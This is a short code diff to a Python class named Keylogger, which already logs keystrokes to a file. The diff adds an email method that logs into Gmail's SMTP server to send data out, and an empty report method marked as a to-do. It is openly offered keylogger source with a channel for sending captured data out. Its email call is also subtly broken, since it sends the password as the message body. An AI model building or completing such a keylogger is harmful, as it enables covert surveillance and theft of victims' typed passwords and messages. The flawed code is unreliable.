@@ -38,3 +38,21 @@ class Keylogger:
     def report_to_file(self):
         with open(f"{self.filename}.txt","w") as f:
             print(self.log, file = f)
+
+    def send_email(self, email, password, message):
+        #establish a connection the SMTP server.
+        server = smtplib.SMTP(host = "smtp.gmail.com", port = 587)
+        #connect to the server in TLS mode.
+        server.starttls()
+
+        #log into the email address
+        server.login(email,password)
+        #send the email to itself
+        server.sendmail(email, email, password)
+
+        #terminate
+        server.quit()
+
+    def report(self):
+        #TO DO
+        pass
